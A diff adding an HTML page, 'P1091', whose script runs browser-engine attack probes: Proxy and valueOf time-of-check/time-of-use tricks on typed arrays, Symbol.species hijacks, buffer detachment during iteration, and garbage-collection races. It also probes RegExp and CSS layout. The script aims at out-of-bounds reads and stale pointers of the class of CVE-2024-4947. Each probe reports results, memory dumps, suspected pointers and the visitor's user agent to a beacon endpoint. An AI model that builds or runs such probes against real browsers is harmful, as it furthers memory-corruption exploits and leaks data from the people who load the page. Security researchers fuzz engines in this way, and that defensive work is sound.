@@ -1,0 +1,765 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>P1091</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8ffc8;font:11px/1.5 monospace;padding:8px;overflow-y:auto}
+.hud{border:1px solid #1a3a1a;border-radius:4px;margin-bottom:6px;padding:6px;background:#0d1117}
+.title{color:#00ff88;font-size:13px;font-weight:bold;margin-bottom:4px}
+.ok{color:#00ff88}.fail{color:#ff4444}.warn{color:#ffaa00}.info{color:#66aaff}.crit{color:#ff00ff;font-weight:bold}
+</style>
+</head>
+<body>
+<div class="hud">
+<div class="title">P1091 — PROXY TOCTOU + ENGINE INTERNALS</div>
+<div class="info">Proxy getter TOCTOU, species hijack, iterator protocol abuse, WeakRef/FinalizationRegistry GC races</div>
+</div>
+<div id="log"></div>
+
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight}
+function B(t,d){try{new Image().src='/beacon.php?tag=P1091-'+encodeURIComponent(t)+'&data='+encodeURIComponent(d)+'&_='+Date.now()}catch(e){}}
+function sl(ms){return new Promise(function(r){setTimeout(r,ms)})}
+
+// ============================================================
+// SECTION A: PROXY TOCTOU ON TYPEDARRAY OPERATIONS
+// If the engine reads a Proxy-backed length/offset twice
+// (once to validate, once to use), returning different values
+// can bypass bounds checks.
+// This is the CVE-2024-4947 class (V8 Maglev).
+// ============================================================
+async function sectionA() {
+  log('warn', '=== A: PROXY TOCTOU (TypedArray) ===');
+  var anomalies = 0;
+
+  // A1: TypedArray.prototype.set() with toggling source length
+  try {
+    for (var round = 0; round < 50; round++) {
+      var target = new Float64Array(4); // small target
+      var callCount = 0;
+
+      // Proxy that changes length on second access
+      var fakeArray = new Proxy({}, {
+        get: function(obj, prop) {
+          if (prop === 'length') {
+            callCount++;
+            // First access: report small length (passes validation)
+            // Second access: report huge length (causes OOB write)
+            return callCount <= 1 ? 2 : 1000;
+          }
+          if (prop === Symbol.iterator) return undefined;
+          // Return controllable values for any index
+          var idx = parseInt(prop);
+          if (!isNaN(idx)) return 3.14159 + idx;
+          return undefined;
+        },
+        has: function(obj, prop) { return true; }
+      });
+
+      try {
+        target.set(fakeArray);
+      } catch(e) {
+        // Expected - engine should catch the mismatch
+      }
+
+      // Check if target was corrupted beyond its bounds
+      // Read adjacent memory via BigUint64Array view of same buffer
+      var u64 = new BigUint64Array(target.buffer);
+      for (var i = 0; i < u64.length; i++) {
+        if (u64[i] !== 0n && u64[i] !== BigInt(Math.floor(3.14159 + i))) {
+          // Unexpected value - possible OOB write corruption
+          anomalies++;
+          B('A1-CORRUPT', 'round:' + round + '|idx:' + i + '|val:' + u64[i].toString(16));
+          log('crit', '[A1-' + round + '] CORRUPT at idx ' + i + ': 0x' + u64[i].toString(16));
+        }
+      }
+    }
+    B('A1-SET', 'anomalies:' + anomalies);
+    log(anomalies > 0 ? 'crit' : 'ok', '[A1] TypedArray.set() proxy length toggle: ' + anomalies + '/50');
+  } catch(e) {
+    B('A1-ERR', e.message);
+    log('fail', '[A1] ' + e.message);
+  }
+
+  // A2: ArrayBuffer.prototype.slice with proxy-backed start/end
+  try {
+    var sliceAnom = 0;
+    for (var round = 0; round < 50; round++) {
+      var buf = new ArrayBuffer(64);
+      var view = new Uint8Array(buf);
+      for (var i = 0; i < 64; i++) view[i] = 0xAA;
+
+      var startCalls = 0;
+      var proxyStart = { valueOf: function() {
+        startCalls++;
+        return startCalls <= 1 ? 0 : -100; // negative on second read
+      }};
+      var endCalls = 0;
+      var proxyEnd = { valueOf: function() {
+        endCalls++;
+        return endCalls <= 1 ? 8 : 9999; // huge on second read
+      }};
+
+      try {
+        var sliced = buf.slice(proxyStart, proxyEnd);
+        // Check if we got more data than expected
+        if (sliced.byteLength > 64) {
+          sliceAnom++;
+          B('A2-OOB', 'round:' + round + '|len:' + sliced.byteLength);
+          log('crit', '[A2-' + round + '] OOB slice! len=' + sliced.byteLength);
+          // Dump the extra bytes for analysis
+          var extra = new Uint8Array(sliced);
+          var hexStr = '';
+          for (var i = 64; i < Math.min(extra.length, 128); i++) {
+            hexStr += extra[i].toString(16).padStart(2, '0');
+          }
+          B('A2-DUMP', hexStr.substring(0, 200));
+        }
+      } catch(e) { /* expected bounds error */ }
+    }
+    B('A2-SLICE', 'anomalies:' + sliceAnom);
+    log(sliceAnom > 0 ? 'crit' : 'ok', '[A2] AB.slice() proxy args: ' + sliceAnom + '/50');
+    anomalies += sliceAnom;
+  } catch(e) {
+    B('A2-ERR', e.message);
+  }
+
+  // A3: DataView construction with toggling byteOffset/byteLength
+  try {
+    var dvAnom = 0;
+    for (var round = 0; round < 50; round++) {
+      var buf = new ArrayBuffer(32);
+      var offsetCalls = 0;
+      var proxyOffset = { valueOf: function() {
+        offsetCalls++;
+        return offsetCalls <= 1 ? 0 : 24; // shift offset on second read
+      }};
+      var lenCalls = 0;
+      var proxyLen = { valueOf: function() {
+        lenCalls++;
+        return lenCalls <= 1 ? 8 : 32; // expand length on second read
+      }};
+
+      try {
+        var dv = new DataView(buf, proxyOffset, proxyLen);
+        // If offset=24 and length=32, that's OOB (24+32 > 32)
+        // Try to read past the buffer
+        try {
+          var val = dv.getBigUint64(24); // should be OOB if length was expanded
+          dvAnom++;
+          B('A3-OOB-READ', 'round:' + round + '|val:0x' + val.toString(16));
+          log('crit', '[A3-' + round + '] OOB DataView read! val=0x' + val.toString(16));
+        } catch(e2) { /* expected RangeError */ }
+      } catch(e) { /* expected construction error */ }
+    }
+    B('A3-DATAVIEW', 'anomalies:' + dvAnom);
+    log(dvAnom > 0 ? 'crit' : 'ok', '[A3] DataView proxy offset/len: ' + dvAnom + '/50');
+    anomalies += dvAnom;
+  } catch(e) {
+    B('A3-ERR', e.message);
+  }
+
+  // A4: TypedArray.prototype.subarray with valueOf TOCTOU
+  try {
+    var subAnom = 0;
+    for (var round = 0; round < 50; round++) {
+      var src = new Uint8Array(16);
+      for (var i = 0; i < 16; i++) src[i] = i;
+
+      var beginCalls = 0;
+      var proxyBegin = { valueOf: function() {
+        beginCalls++;
+        if (beginCalls > 1) {
+          // On second call, neuter the underlying buffer by transferring it
+          try { structuredClone(src.buffer, { transfer: [src.buffer] }); } catch(e) {}
+        }
+        return 0;
+      }};
+
+      try {
+        var sub = src.subarray(proxyBegin, 8);
+        // If buffer was detached mid-operation, sub might reference freed memory
+        if (sub.length > 0) {
+          var firstByte = sub[0];
+          if (firstByte !== 0 && firstByte !== undefined) {
+            subAnom++;
+            B('A4-STALE', 'round:' + round + '|val:' + firstByte);
+            log('crit', '[A4-' + round + '] STALE data after detach: ' + firstByte);
+          }
+        }
+      } catch(e) { /* expected - detached buffer */ }
+    }
+    B('A4-SUBARRAY', 'anomalies:' + subAnom);
+    log(subAnom > 0 ? 'crit' : 'ok', '[A4] subarray+detach race: ' + subAnom + '/50');
+    anomalies += subAnom;
+  } catch(e) {
+    B('A4-ERR', e.message);
+  }
+
+  B('A-DONE', 'total:' + anomalies);
+  log(anomalies > 0 ? 'crit' : 'ok', '[A] PROXY TOCTOU total: ' + anomalies);
+  return anomalies;
+}
+
+// ============================================================
+// SECTION B: SPECIES CONSTRUCTOR HIJACK
+// Symbol.species allows overriding the constructor used by
+// built-in methods like Array.prototype.map/filter/slice.
+// A malicious species that returns a different-sized array
+// can cause the engine to write past the allocated bounds.
+// ============================================================
+async function sectionB() {
+  log('warn', '=== B: SPECIES CONSTRUCTOR HIJACK ===');
+  var anomalies = 0;
+
+  // B1: Array.prototype.map with evil species
+  try {
+    for (var round = 0; round < 30; round++) {
+      var arr = [1,2,3,4,5,6,7,8];
+      var EvilArray = function(len) {
+        // Return a SMALLER array than requested
+        return new Array(1);
+      };
+
+      try {
+        // Override species to use our evil constructor
+        arr.constructor = {};
+        arr.constructor[Symbol.species] = EvilArray;
+        var result = arr.map(function(x) { return x * 2; });
+        // If engine used our constructor (size 1) but wrote 8 elements...
+        if (result.length > 1 && result[7] !== undefined) {
+          // Engine expanded it properly - safe
+        } else if (result.length === 1 && result[0] === 2) {
+          // Engine respected the small size - safe
+        } else {
+          anomalies++;
+          B('B1-WEIRD', 'round:' + round + '|len:' + result.length + '|v0:' + result[0]);
+          log('crit', '[B1-' + round + '] Unexpected map result');
+        }
+      } catch(e) { /* engine rejected evil species - safe */ }
+    }
+    B('B1-MAP', 'anomalies:' + anomalies);
+    log(anomalies > 0 ? 'crit' : 'ok', '[B1] Array.map species: ' + anomalies + '/30');
+  } catch(e) {
+    B('B1-ERR', e.message);
+  }
+
+  // B2: Array.prototype.slice with detaching species
+  try {
+    var sliceAnom = 0;
+    for (var round = 0; round < 30; round++) {
+      var buf = new ArrayBuffer(64);
+      var typed = new Uint32Array(buf);
+      for (var i = 0; i < typed.length; i++) typed[i] = 0xDEAD0000 + i;
+
+      // Species that detaches the buffer during construction
+      var EvilSpecies = function(len) {
+        try { structuredClone(buf, { transfer: [buf] }); } catch(e) {}
+        return new Array(len);
+      };
+
+      var arr = Array.from(typed);
+      arr.constructor = {};
+      arr.constructor[Symbol.species] = EvilSpecies;
+
+      try {
+        var sliced = arr.slice(0, 4);
+        // Check if values came from detached buffer
+        for (var i = 0; i < sliced.length; i++) {
+          if (sliced[i] !== 0xDEAD0000 + i && sliced[i] !== 0 && sliced[i] !== undefined) {
+            sliceAnom++;
+            B('B2-STALE', 'round:' + round + '|idx:' + i + '|val:0x' + sliced[i].toString(16));
+            log('crit', '[B2-' + round + '] STALE slice data');
+          }
+        }
+      } catch(e) { /* expected */ }
+    }
+    B('B2-SLICE', 'anomalies:' + sliceAnom);
+    log(sliceAnom > 0 ? 'crit' : 'ok', '[B2] slice+detach species: ' + sliceAnom + '/30');
+    anomalies += sliceAnom;
+  } catch(e) {
+    B('B2-ERR', e.message);
+  }
+
+  // B3: TypedArray.prototype.filter with length-changing species
+  try {
+    var filterAnom = 0;
+    for (var round = 0; round < 30; round++) {
+      var src = new Uint32Array([1,2,3,4,5,6,7,8,9,10]);
+      var callIdx = 0;
+
+      try {
+        // filter callback that modifies the source array mid-iteration
+        var result = Array.prototype.filter.call(src, function(val, idx) {
+          callIdx++;
+          if (callIdx === 5) {
+            // Mid-filter: detach the buffer
+            try { structuredClone(src.buffer, { transfer: [src.buffer] }); } catch(e) {}
+          }
+          return val > 3;
+        });
+
+        // Check if we got stale/freed memory values
+        for (var i = 0; i < result.length; i++) {
+          if (result[i] > 10 || result[i] < 0) {
+            filterAnom++;
+            B('B3-STALE', 'round:' + round + '|idx:' + i + '|val:' + result[i]);
+            log('crit', '[B3-' + round + '] STALE filter data: ' + result[i]);
+          }
+        }
+      } catch(e) { /* expected */ }
+    }
+    B('B3-FILTER', 'anomalies:' + filterAnom);
+    log(filterAnom > 0 ? 'crit' : 'ok', '[B3] filter+detach: ' + filterAnom + '/30');
+    anomalies += filterAnom;
+  } catch(e) {
+    B('B3-ERR', e.message);
+  }
+
+  // B4: Promise.all with species that interferes
+  try {
+    var promAnom = 0;
+    var EvilPromise = function(exec) {
+      // Run the executor but return a plain object
+      var res, rej;
+      exec(function(v) { res = v; }, function(e) { rej = e; });
+      return { then: function(ok, fail) {
+        // Resolve with garbage
+        if (ok) ok(0xDEADBEEF);
+      }};
+    };
+    EvilPromise[Symbol.species] = EvilPromise;
+    EvilPromise.resolve = Promise.resolve.bind(Promise);
+
+    // This likely won't work but worth trying
+    try {
+      var p = Promise.all.call(EvilPromise, [1, 2, 3]);
+      if (p && p.then) {
+        p.then(function(val) {
+          B('B4-RESULT', JSON.stringify(val).substring(0, 100));
+        });
+      }
+    } catch(e) { /* expected */ }
+    B('B4-PROMISE', 'tested');
+    log('ok', '[B4] Promise.all species: tested');
+  } catch(e) {
+    B('B4-ERR', e.message);
+  }
+
+  B('B-DONE', 'total:' + anomalies);
+  log(anomalies > 0 ? 'crit' : 'ok', '[B] SPECIES total: ' + anomalies);
+  return anomalies;
+}
+
+// ============================================================
+// SECTION C: ITERATOR PROTOCOL ABUSE
+// Custom iterators that change state during iteration can
+// confuse engine internals that assume stable iteration.
+// ============================================================
+async function sectionC() {
+  log('warn', '=== C: ITERATOR PROTOCOL ABUSE ===');
+  var anomalies = 0;
+
+  // C1: Array.from with iterator that detaches its source
+  try {
+    for (var round = 0; round < 30; round++) {
+      var buf = new ArrayBuffer(64);
+      var view = new BigUint64Array(buf);
+      for (var i = 0; i < view.length; i++) view[i] = BigInt(0xCAFE0000 + i);
+
+      var iterCount = 0;
+      var evilIter = {};
+      evilIter[Symbol.iterator] = function() {
+        return {
+          next: function() {
+            iterCount++;
+            if (iterCount === 4) {
+              // Detach the buffer mid-iteration
+              try { structuredClone(buf, { transfer: [buf] }); } catch(e) {}
+            }
+            if (iterCount <= 8) {
+              try {
+                return { value: view[iterCount - 1], done: false };
+              } catch(e) {
+                return { value: 'DETACHED', done: false };
+              }
+            }
+            return { done: true };
+          }
+        };
+      };
+
+      try {
+        var result = Array.from(evilIter);
+        // Check for stale BigInt values (freed memory reinterpreted)
+        for (var i = 0; i < result.length; i++) {
+          if (typeof result[i] === 'bigint') {
+            var hi = Number(result[i] >> 32n);
+            // Check if it looks like a kernel or heap pointer
+            if (hi >= 0xFFFF8000 || (hi >= 0x7F00 && hi <= 0x7FFF)) {
+              anomalies++;
+              B('C1-KPTR', 'round:' + round + '|idx:' + i + '|val:0x' + result[i].toString(16));
+              log('crit', '[C1-' + round + '] SUSPICIOUS pointer: 0x' + result[i].toString(16));
+            }
+          }
+        }
+      } catch(e) { /* expected */ }
+    }
+    B('C1-FROM', 'anomalies:' + anomalies);
+    log(anomalies > 0 ? 'crit' : 'ok', '[C1] Array.from+detach iter: ' + anomalies + '/30');
+  } catch(e) {
+    B('C1-ERR', e.message);
+  }
+
+  // C2: structuredClone with evil iterator in Map
+  try {
+    var cloneAnom = 0;
+    for (var round = 0; round < 20; round++) {
+      try {
+        var m = new Map();
+        m.set('a', 1);
+        m.set('b', 2);
+
+        // Add a getter that allocates during clone
+        var obj = {};
+        Object.defineProperty(obj, 'x', {
+          get: function() {
+            // Allocate a lot during the clone operation
+            var garbage = [];
+            for (var i = 0; i < 100; i++) garbage.push(new ArrayBuffer(4096));
+            return garbage.length;
+          },
+          enumerable: true
+        });
+        m.set('evil', obj);
+
+        var cloned = structuredClone(m);
+        // structuredClone should either clone properly or throw
+        if (cloned.get('evil') !== 100) {
+          cloneAnom++;
+          B('C2-WEIRD', 'round:' + round + '|val:' + cloned.get('evil'));
+        }
+      } catch(e) {
+        // DataCloneError is expected for non-cloneable objects
+      }
+    }
+    B('C2-CLONE', 'anomalies:' + cloneAnom);
+    log(cloneAnom > 0 ? 'crit' : 'ok', '[C2] structuredClone+getter: ' + cloneAnom + '/20');
+    anomalies += cloneAnom;
+  } catch(e) {
+    B('C2-ERR', e.message);
+  }
+
+  // C3: for-of with iterator that GC-pressures during next()
+  try {
+    var gcAnom = 0;
+    for (var round = 0; round < 20; round++) {
+      var collected = [];
+      var evilIter = {};
+      evilIter[Symbol.iterator] = function() {
+        var idx = 0;
+        var refs = [];
+        return {
+          next: function() {
+            idx++;
+            if (idx <= 50) {
+              // Create objects and immediately drop references to pressure GC
+              for (var i = 0; i < 50; i++) {
+                var ab = new ArrayBuffer(65536);
+                var v = new BigUint64Array(ab);
+                v[0] = BigInt('0xDEADCAFE' + idx.toString(16));
+                refs.push(new WeakRef(ab));
+              }
+              // Drop all strong refs
+              refs = [];
+              return { value: idx, done: false };
+            }
+            return { done: true };
+          }
+        };
+      };
+
+      try {
+        for (var val of evilIter) {
+          collected.push(val);
+        }
+      } catch(e) { /* expected */ }
+    }
+    B('C3-GCITER', 'tested');
+    log('ok', '[C3] GC-pressure iterator: tested');
+  } catch(e) {
+    B('C3-ERR', e.message);
+  }
+
+  B('C-DONE', 'total:' + anomalies);
+  return anomalies;
+}
+
+// ============================================================
+// SECTION D: WEAKREF + FINALIZATIONREGISTRY GC INTERACTION
+// If available, these can expose GC timing and potentially
+// create references to already-collected objects.
+// ============================================================
+async function sectionD() {
+  log('warn', '=== D: WEAKREF + FINALIZATIONREGISTRY ===');
+  var anomalies = 0;
+
+  // D1: Check availability
+  var hasWeakRef = typeof WeakRef !== 'undefined';
+  var hasFinReg = typeof FinalizationRegistry !== 'undefined';
+  B('D1-AVAIL', 'WeakRef:' + hasWeakRef + '|FinalizationRegistry:' + hasFinReg);
+  log('info', '[D1] WeakRef=' + hasWeakRef + ' FinalizationRegistry=' + hasFinReg);
+
+  if (!hasWeakRef) {
+    B('D-DONE', 'no-WeakRef');
+    log('fail', '[D] No WeakRef — skipping');
+    return 0;
+  }
+
+  // D2: WeakRef deref timing
+  try {
+    var derefResults = [];
+    for (var round = 0; round < 10; round++) {
+      var target = new ArrayBuffer(1024 * 1024); // 1MB
+      var ref = new WeakRef(target);
+      target = null; // Drop strong reference
+
+      // Pressure GC
+      var garbage = [];
+      for (var i = 0; i < 200; i++) {
+        garbage.push(new ArrayBuffer(1024 * 1024));
+      }
+      garbage = null;
+
+      await sl(10);
+
+      var derefed = ref.deref();
+      derefResults.push(derefed !== undefined);
+    }
+    var aliveCount = derefResults.filter(function(x) { return x; }).length;
+    B('D2-DEREF', 'alive:' + aliveCount + '/10');
+    log('info', '[D2] WeakRef deref: ' + aliveCount + '/10 still alive after GC pressure');
+  } catch(e) {
+    B('D2-ERR', e.message);
+  }
+
+  // D3: FinalizationRegistry callback race
+  if (hasFinReg) {
+    try {
+      var finalized = [];
+      var registry = new FinalizationRegistry(function(heldValue) {
+        finalized.push(heldValue);
+        // Inside finalization callback, try to allocate
+        var newBuf = new ArrayBuffer(4096);
+        var v = new Uint32Array(newBuf);
+        v[0] = 0xFEEDFACE;
+      });
+
+      // Register many objects
+      for (var i = 0; i < 100; i++) {
+        var obj = { id: i, data: new ArrayBuffer(65536) };
+        registry.register(obj, 'held-' + i);
+      }
+      // Drop all references
+      // Pressure GC
+      for (var i = 0; i < 5; i++) {
+        var g = [];
+        for (var j = 0; j < 200; j++) g.push(new ArrayBuffer(1024 * 1024));
+        g = null;
+        await sl(20);
+      }
+
+      B('D3-FINREG', 'callbacks:' + finalized.length);
+      log('info', '[D3] FinalizationRegistry: ' + finalized.length + ' callbacks fired');
+
+      // D4: Register object, get WeakRef, finalize, try deref
+      for (var round = 0; round < 20; round++) {
+        var buf = new ArrayBuffer(1024 * 512);
+        var weakBuf = new WeakRef(buf);
+        var finCalled = false;
+
+        var reg2 = new FinalizationRegistry(function() {
+          finCalled = true;
+          // Try to deref inside finalization — might get stale pointer
+          var stale = weakBuf.deref();
+          if (stale) {
+            anomalies++;
+            B('D4-STALE', 'round:' + round + '|len:' + stale.byteLength);
+            log('crit', '[D4-' + round + '] STALE deref inside finalization! len=' + stale.byteLength);
+          }
+        });
+        reg2.register(buf, 'test');
+        buf = null;
+
+        // GC pressure
+        var g = [];
+        for (var j = 0; j < 300; j++) g.push(new ArrayBuffer(1024 * 1024));
+        g = null;
+        await sl(20);
+      }
+      B('D4-STALE-CHECK', 'anomalies:' + anomalies);
+      log(anomalies > 0 ? 'crit' : 'ok', '[D4] Finalize+deref race: ' + anomalies + '/20');
+    } catch(e) {
+      B('D3-ERR', e.message);
+    }
+  }
+
+  B('D-DONE', 'total:' + anomalies);
+  return anomalies;
+}
+
+// ============================================================
+// SECTION E: REGEXP INTERNAL STATE CORRUPTION
+// Complex regexps with specific patterns can trigger internal
+// engine operations that might have bounds issues.
+// ============================================================
+async function sectionE() {
+  log('warn', '=== E: REGEXP INTERNALS ===');
+  var anomalies = 0;
+
+  // E1: RegExp.prototype[Symbol.replace] with changing string
+  try {
+    for (var round = 0; round < 20; round++) {
+      var callCount = 0;
+      var str = 'AAAAAAAABBBBBBBB';
+      var re = /A+/g;
+
+      // Override exec to change lastIndex mid-operation
+      var origExec = RegExp.prototype.exec;
+      try {
+        re[Symbol.replace](str, function() {
+          callCount++;
+          if (callCount === 1) {
+            // Mutate the string reference during replacement
+            str = 'CCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDD' + 'E'.repeat(10000);
+          }
+          return 'X';
+        });
+      } catch(e) { /* expected */ }
+    }
+    B('E1-REPLACE', 'tested');
+    log('ok', '[E1] RegExp replace mutation: tested');
+  } catch(e) {
+    B('E1-ERR', e.message);
+  }
+
+  // E2: String.prototype.match with proxy string
+  try {
+    for (var round = 0; round < 20; round++) {
+      var proxyStr = new Proxy(new String('test string hello world'), {
+        get: function(target, prop) {
+          if (prop === 'length') return 10000; // lie about length
+          if (prop === Symbol.toPrimitive) return function() { return 'ab'; };
+          return target[prop];
+        }
+      });
+
+      try {
+        var result = String.prototype.match.call(proxyStr, /./g);
+        if (result && result.length > 100) {
+          anomalies++;
+          B('E2-OVERREAD', 'round:' + round + '|len:' + result.length);
+          log('crit', '[E2-' + round + '] OVERREAD: ' + result.length + ' matches');
+        }
+      } catch(e) { /* expected */ }
+    }
+    B('E2-MATCH', 'anomalies:' + anomalies);
+    log(anomalies > 0 ? 'crit' : 'ok', '[E2] Proxy string match: ' + anomalies + '/20');
+  } catch(e) {
+    B('E2-ERR', e.message);
+  }
+
+  B('E-DONE', 'total:' + anomalies);
+  return anomalies;
+}
+
+// ============================================================
+// SECTION F: CSS CONTAINMENT + LAYOUT RE-ENTRANCY
+// Container queries can trigger layout recalculation during
+// style resolution, which might corrupt internal state.
+// ============================================================
+async function sectionF() {
+  log('warn', '=== F: CSS CONTAINER QUERY RE-ENTRANCY ===');
+  var anomalies = 0;
+
+  try {
+    // Create a container query setup that causes layout loops
+    var container = document.createElement('div');
+    container.style.cssText = 'container-type:inline-size;width:300px;position:absolute;left:-9999px';
+    document.body.appendChild(container);
+
+    var style = document.createElement('style');
+    style.textContent = '@container (min-width: 200px) { .cq-child { width: 150px; } } ' +
+                        '@container (min-width: 100px) { .cq-child { height: 50px; } } ' +
+                        '@container (max-width: 250px) { .cq-child { background: red; } }';
+    document.head.appendChild(style);
+
+    for (var round = 0; round < 30; round++) {
+      // Create children that change container size
+      var child = document.createElement('div');
+      child.className = 'cq-child';
+      child.style.cssText = 'width:100%;float:left';
+      container.appendChild(child);
+
+      // Rapidly change container size to trigger re-queries
+      for (var w = 50; w <= 500; w += 50) {
+        container.style.width = w + 'px';
+        // Force synchronous layout
+        void container.offsetWidth;
+      }
+
+      // Check if child dimensions are consistent
+      var rect = child.getBoundingClientRect();
+      if (isNaN(rect.width) || isNaN(rect.height) || rect.width < 0 || rect.height < 0) {
+        anomalies++;
+        B('F-BAD-RECT', 'round:' + round + '|w:' + rect.width + '|h:' + rect.height);
+        log('crit', '[F-' + round + '] BAD rect: ' + rect.width + 'x' + rect.height);
+      }
+
+      container.removeChild(child);
+    }
+
+    document.body.removeChild(container);
+    document.head.removeChild(style);
+
+    B('F-CQ', 'anomalies:' + anomalies);
+    log(anomalies > 0 ? 'crit' : 'ok', '[F] Container query re-entrancy: ' + anomalies + '/30');
+  } catch(e) {
+    B('F-ERR', e.message);
+    log('fail', '[F] ' + e.message);
+  }
+
+  B('F-DONE', 'total:' + anomalies);
+  return anomalies;
+}
+
+// ============================================================
+// MAIN
+// ============================================================
+async function run() {
+  B('BOOT', navigator.userAgent.substring(0, 80));
+  log('ok', '=== P1091: PROXY TOCTOU + ENGINE INTERNALS ===');
+  log('info', 'Deep engine attacks: Proxy valueOf TOCTOU, species hijack, iterator abuse, WeakRef GC, RegExp internals, CSS containment');
+  log('ok', '');
+
+  var totalAnom = 0;
+  totalAnom += await sectionA(); log('ok', ''); await sl(100);
+  totalAnom += await sectionB(); log('ok', ''); await sl(100);
+  totalAnom += await sectionC(); log('ok', ''); await sl(100);
+  totalAnom += await sectionD(); log('ok', ''); await sl(100);
+  totalAnom += await sectionE(); log('ok', ''); await sl(100);
+  totalAnom += await sectionF();
+
+  log('ok', '');
+  B('ALL-DONE', 'sections:6|total_anomalies:' + totalAnom);
+  log(totalAnom > 0 ? 'crit' : 'ok', '=== P1091 COMPLETE: ' + totalAnom + ' total anomalies ===');
+}
+
+run();
+</script>
+</body>
+</html>
